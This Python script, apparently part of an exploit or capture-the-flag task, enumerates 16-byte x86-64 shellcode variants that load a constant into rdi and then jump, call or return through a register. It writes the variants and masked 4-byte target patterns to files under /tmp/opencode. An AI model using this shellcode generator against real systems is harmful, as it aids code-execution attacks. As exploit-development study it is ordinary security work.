#!/usr/bin/env python3
import hashlib, json
from collections import Counter

V = 0x7B3DC26F1
def leh(x, n):
    return ''.join('%02x' % ((x >> (8*i)) & 0xff) for i in range(n))

# ---------------- set recipes: build rdi = V ----------------
# (hex, clobbers_rax)
sets = []
sets.append(('48bf' + leh(V, 8), False))                      # mov rdi, imm64
# build in rdi: mov edi,m ; shl rdi,s ; add rdi,r
for s in range(1, 33):
    m = V >> s
    if m > 0xffffffff: continue
    r = V - (m << s)
    base = 'bf' + leh(m, 4)
    shl = '48c1e7' + '%02x' % s
    if r == 0:
        sets.append((base + shl, False))
    elif r < 0x80:
        sets.append((base + shl + '4883c7' + '%02x' % r, False))
    elif r < 0x80000000:
        sets.append((base + shl + '4881c7' + leh(r, 4), False))
# build in rax then push rax; pop rdi
for s in range(1, 33):
    m = V >> s
    if m > 0xffffffff: continue
    r = V - (m << s)
    base = 'b8' + leh(m, 4)
    shl = '48c1e0' + '%02x' % s
    tail = '505f'
    if r == 0:
        sets.append((base + shl + tail, True))
    elif r < 0x80:
        sets.append((base + shl + '4883c0' + '%02x' % r + tail, True))
    elif r < 0x80000000:
        sets.append((base + shl + '4805' + leh(r, 4) + tail, True))

# ---------------- saves + calls ----------------
# (save_hex, uses_rax, [(call_hex, tail_free)])
saves = [
    ('57', False, [('c3', True), ('ff2424', True), ('ff1424', False),
                   ('5bffd3', False), ('5bffe3', True)]),
    ('4889fb', False, [('ffd3', False), ('ffe3', True)]),
    ('4889f9', False, [('ffd1', False), ('ffe1', True)]),
    ('4889fa', False, [('ffd2', False), ('ffe2', True)]),
    ('4889fe', False, [('ffd6', False), ('ffe6', True)]),
    ('4889f8', True,  [('ffd0', False), ('ffe0', True)]),
    ('4897',   True,  [('ffd0', False), ('ffe0', True)]),
    ('575b',   False, [('ffd3', False), ('ffe3', True)]),  # push rdi; pop rbx
]

nops = ['', '90', '9090', '6690', '0f1f00', '90'*3, '66666690']
LEN = 16

shells = {}
def add(pat):
    shells[''.join(pat)] = None

for save, uses_rax, calls in saves:
    sb = bytes.fromhex(save)
    for st, sclob in sets:
        if sclob and uses_rax: continue
        stb = bytes.fromhex(st)
        for call, tfree in calls:
            cb = bytes.fromhex(call)
            for nb in nops:
                nbb = bytes.fromhex(nb)
                for nm in nops:
                    nmb = bytes.fromhex(nm)
                    for npl in nops:
                        nplb = bytes.fromhex(npl)
                        code = nbb + sb + nmb + stb + nplb + cb
                        if len(code) > LEN: continue
                        pat = ['%02x' % b for b in code]
                        pat += (['??'] if tfree else ['90']) * (LEN - len(code))
                        add(pat)

# ---------------- extract targets ----------------
targets = {}
shells_list = []
for key in shells:
    pat = [key[i*2:i*2+2] for i in range(LEN)]
    chunks = []
    for g in range(4):
        vals, masks = [], []
        for j in range(4):
            t = pat[4*g+j]
            if t == '??': vals.append(0); masks.append(0)
            else: vals.append(int(t, 16)); masks.append(1)
        if any(masks):
            targets[(g, tuple(vals), tuple(masks))] = None
        chunks.append((vals, masks))
    shells_list.append((key, chunks))

tlist = sorted(targets.keys(), key=lambda t: (t[0], -sum(t[2]), t[1]))
with open('/tmp/opencode/targets.txt', 'w') as f:
    for g, vals, masks in tlist:
        toks = ['??' if masks[j] == 0 else '%02x' % vals[j] for j in range(4)]
        f.write('%d %s\n' % (g, ' '.join(toks)))
with open('/tmp/opencode/shells.txt', 'w') as f:
    for key, _ in shells_list:
        f.write(key + '\n')
json.dump([[g, list(v), list(m)] for g, v, m in tlist], open('/tmp/opencode/targets.json', 'w'))
print("shells:", len(shells_list), "targets:", len(tlist))
c = Counter(g for g, _, _ in tlist)
print("per group:", dict(sorted(c.items())))
# partial (wildcard) counts
pc = Counter()
for g, v, m in tlist:
    if sum(m) < 4: pc[g] += 1
print("partial per group:", dict(sorted(pc.items())))
